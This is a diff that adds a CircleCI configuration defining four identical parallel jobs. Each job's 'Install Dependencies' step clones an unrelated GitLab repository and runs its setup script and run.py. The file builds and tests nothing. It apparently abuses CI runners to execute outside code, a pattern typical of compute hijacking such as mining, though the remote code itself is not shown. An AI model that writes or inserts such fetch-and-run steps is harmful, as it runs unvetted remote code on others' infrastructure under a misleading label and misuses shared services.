@@ -1,0 +1,42 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py
+
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py
+
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py
+
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
